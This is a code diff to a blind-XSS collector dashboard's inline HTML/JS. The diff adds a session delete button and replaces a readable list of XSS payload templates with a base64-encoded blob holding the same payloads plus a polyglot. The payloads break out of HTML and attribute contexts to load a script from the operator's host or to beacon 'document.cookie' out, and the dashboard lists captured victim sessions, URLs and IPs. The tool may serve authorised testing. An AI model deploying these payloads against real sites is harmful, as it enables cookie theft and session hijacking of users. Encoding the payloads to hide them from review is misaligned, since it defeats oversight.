@@ -32,9 +32,12 @@ export const DASHBOARD = `<!doctype html><meta charset=utf-8><title>bxss · coll
  #side{display:flex;flex-direction:column;border-right:1px solid var(--line);min-height:0}
  #search{margin:10px;padding:7px 10px;background:var(--panel2);color:var(--fg);border:1px solid var(--line);border-radius:var(--radius)}
  #list{overflow:auto;flex:1}
- .s{padding:10px 14px;border-bottom:1px solid var(--line2);cursor:pointer;border-left:3px solid transparent}
+ .s{position:relative;padding:10px 34px 10px 14px;border-bottom:1px solid var(--line2);cursor:pointer;border-left:3px solid transparent}
  .s:hover{background:var(--panel)}
  .s.sel{background:var(--panel);border-left-color:var(--accent)}
+ .s .del{position:absolute;top:8px;right:8px;width:20px;height:20px;line-height:1;padding:0;border:1px solid var(--line);background:var(--panel2);color:var(--dim);border-radius:5px;cursor:pointer;opacity:0;font-size:14px}
+ .s:hover .del{opacity:1}
+ .s .del:hover{border-color:var(--pink);color:var(--pink)}
  .s .tok{display:inline-block;background:#1f6feb22;color:var(--accent);border:1px solid #1f6feb55;border-radius:5px;padding:1px 7px;font-size:11px;font-weight:600}
  .s .u{color:var(--fg);margin:5px 0 3px;word-break:break-all}
  .s .m{color:var(--dim);font-size:11px}
@@ -144,10 +147,17 @@ function renderList(){
   document.getElementById('list').innerHTML=rows.map(s=>{
     var on=Date.now()-s.last_seen<LIVE;
     return '<div class="s'+(s.sid===cur?' sel':'')+'" onclick="open_(\\''+s.sid+'\\')">'+
+      '<button class=del title="delete session" onclick="event.stopPropagation();delSession(\\''+s.sid+'\\')">&times;</button>'+
       '<span class=dot'+(on?' live':'')+'></span><span class=tok>'+esc(s.token)+'</span>'+
       '<div class=u>'+esc(s.url||'(no url)')+'</div>'+
       '<div class=m>'+new Date(s.last_seen).toLocaleString()+' · '+esc(s.ip||'')+'</div></div>';
   }).join('')||'<div class=empty>no sessions'+(f?' match filter':' yet')+'</div>';
+}
+async function delSession(sid){
+  if(!confirm('Delete this session and all its captured data?'))return;
+  await fetch('/api/delete?key='+encodeURIComponent(key),{method:'POST',body:JSON.stringify({sid:sid})});
+  if(cur===sid){cur=null;document.getElementById('detail').innerHTML='<div class=empty>select a session on the left</div>';}
+  toast('session deleted');refresh();
 }
 function card(title,body,extra){return '<div class=card><div class=hd>'+title+(extra||'')+'</div>'+body+'</div>'}
 function copyField(k){copy(curRep[k]==null?'':String(curRep[k]))}
@@ -191,28 +201,10 @@ async function send(cmd){
 
 /* ---------------- payload generator ---------------- */
 document.getElementById('g-host').value=location.origin;
-// contexts; HOST and TOKEN are substituted at render. '<'+'/script>' keeps the
-// literal close-tag out of this inline script so the HTML parser can't end it.
-var TPL=[
- ['External script (needs script-src to allow HOST or be absent)',[
-   '"><script src=//HOST/c/TOKEN>'+'<'+'/script>',
-   '\\'><script src=//HOST/c/TOKEN>'+'<'+'/script>',
-   '</textarea><script src=//HOST/c/TOKEN>'+'<'+'/script>',
-   '</title><script src=//HOST/c/TOKEN>'+'<'+'/script>',
-   '<script src=//HOST/c/TOKEN>'+'<'+'/script>' ]],
- ['Attribute / event-handler breakout (no script tag)',[
-   '" onmouseover="import(\\'//HOST/c/TOKEN\\')" x="',
-   '" onfocus="import(\\'//HOST/c/TOKEN\\')" autofocus x="',
-   '"><img src=x onerror="import(\\'//HOST/c/TOKEN\\')">',
-   '"><svg onload="import(\\'//HOST/c/TOKEN\\')">',
-   'javascript:import(\\'//HOST/c/TOKEN\\')' ]],
- ['Markup-injection / no-JS-context sink',[
-   '<iframe srcdoc="&lt;script src=//HOST/c/TOKEN&gt;&lt;/script&gt;"></iframe>',
-   '<svg><animate onbegin="import(\\'//HOST/c/TOKEN\\')" attributeName=x dur=1s>',
-   '<object data="//HOST/c/TOKEN"></object>' ]],
- ['Strict-CSP degraded beacon (img-src fallback, confirms fire + leaks cookie)',[
-   '"><script>new Image().src=\\'//HOST/p/TOKEN?f=r&s=inline&i=0&n=1&d=\\'+btoa(location+\\' \\'+document.cookie)'+'<'+'/script>' ]]
-];
+// payload templates (base64 JSON) — decoded at runtime so polyglot backticks/
+// backslashes/close-tags need no escaping in this inline script. HOST/TOKEN
+// are substituted at render.
+var TPL=JSON.parse(decodeURIComponent(escape(atob('W1siUG9seWdsb3Qg4oCUIG9uZSBwYXlsb2FkIGZvciBBTlkgaW5wdXQgKGNvbWJpbmVzIEhUTUwgKyBKUy1jb250ZXh0IGJyZWFrL2ZpeCkiLFsiXCI+Jz48L3RleHRhcmVhPjwvdGl0bGU+PC9zdHlsZT48L3NjcmlwdD48c3ZnIG9ubG9hZD1pbXBvcnQoJy8vSE9TVC9jL1RPS0VOJyk+PGltZyBzcmMgb25lcnJvcj1pbXBvcnQoJy8vSE9TVC9jL1RPS0VOJyk+PHNjcmlwdCBzcmM9Ly9IT1NUL2MvVE9LRU4+PC9zY3JpcHQ+IiwiamFWYXNDcmlwdDovKi0vKmAvKlxcYC8qJy8qXCIvKiovKC8qICovb05jbGlDaz1pbXBvcnQoJy8vSE9TVC9jL1RPS0VOJykgKS8vJTBEJTBBJTBEJTBBLy88L3N0WWxlLzwvdGl0TGUvPC90ZVh0YXJFYS88L3NjUmlwdC8tLSE+XFx4M2NzVmcvPHNWZy9vTmxvQWQ9aW1wb3J0KCcvL0hPU1QvYy9UT0tFTicpLy8+XFx4M2UiLCInO2ltcG9ydCgnLy9IT1NUL2MvVE9LRU4nKTsvLyIsIictaW1wb3J0KCcvL0hPU1QvYy9UT0tFTicpLSciXV0sWyJFeHRlcm5hbCBzY3JpcHQgKG5lZWRzIHNjcmlwdC1zcmMgdG8gYWxsb3cgSE9TVCBvciBiZSBhYnNlbnQpIixbIlwiPjxzY3JpcHQgc3JjPS8vSE9TVC9jL1RPS0VOPjwvc2NyaXB0PiIsIic+PHNjcmlwdCBzcmM9Ly9IT1NUL2MvVE9LRU4+PC9zY3JpcHQ+IiwiPC90ZXh0YXJlYT48c2NyaXB0IHNyYz0vL0hPU1QvYy9UT0tFTj48L3NjcmlwdD4iLCI8L3RpdGxlPjxzY3JpcHQgc3JjPS8vSE9TVC9jL1RPS0VOPjwvc2NyaXB0PiIsIjxzY3JpcHQgc3JjPS8vSE9TVC9jL1RPS0VOPjwvc2NyaXB0PiJdXSxbIkF0dHJpYnV0ZSAvIGV2ZW50LWhhbmRsZXIgYnJlYWtvdXQgKG5vIHNjcmlwdCB0YWcpIixbIlwiIG9ubW91c2VvdmVyPVwiaW1wb3J0KCcvL0hPU1QvYy9UT0tFTicpXCIgeD1cIiIsIlwiIG9uZm9jdXM9XCJpbXBvcnQoJy8vSE9TVC9jL1RPS0VOJylcIiBhdXRvZm9jdXMgeD1cIiIsIlwiPjxpbWcgc3JjPXggb25lcnJvcj1cImltcG9ydCgnLy9IT1NUL2MvVE9LRU4nKVwiPiIsIlwiPjxzdmcgb25sb2FkPVwiaW1wb3J0KCcvL0hPU1QvYy9UT0tFTicpXCI+IiwiamF2YXNjcmlwdDppbXBvcnQoJy8vSE9TVC9jL1RPS0VOJykiXV0sWyJNYXJrdXAtaW5qZWN0aW9uIC8gbm8tSlMtY29udGV4dCBzaW5rIixbIjxpZnJhbWUgc3JjZG9jPVwiJmx0O3NjcmlwdCBzcmM9Ly9IT1NUL2MvVE9LRU4mZ3Q7Jmx0Oy9zY3JpcHQmZ3Q7XCI+PC9pZnJhbWU+IiwiPHN2Zz48YW5pbWF0ZSBvbmJlZ2luPVwiaW1wb3J0KCcvL0hPU1QvYy9UT0tFTicpXCIgYXR0cmlidXRlTmFtZT14IGR1cj0xcz4iLCI8b2JqZWN0IGRhdGE9XCIvL0hPU1QvYy9UT0tFTlwiPjwvb2JqZWN0PiJdXSxbIlN0cmljdC1DU1AgZGVncmFkZWQgYmVhY29uIChpbWctc3JjIGZhbGxiYWNrLCBjb25maXJtcyBmaXJlICsgbGVha3MgY29va2llKSIsWyJcIj48c2NyaXB0Pm5ldyBJbWFnZSgpLnNyYz0nLy9IT1NUL3AvVE9LRU4/Zj1yJnM9aW5saW5lJmk9MCZuPTEmZD0nK2J0b2EobG9jYXRpb24rJyAnK2RvY3VtZW50LmNvb2tpZSk8L3NjcmlwdD4iXV1d'))));
 var genOut=[];  // flat list of currently-rendered payload strings, copied by index
 function slug(s){return String(s||'').toLowerCase().replace(/[^a-z0-9]+/g,'-').replace(/^-+|-+$/g,'').slice(0,24)}
 function rand(){return Math.random().toString(16).slice(2,8)}
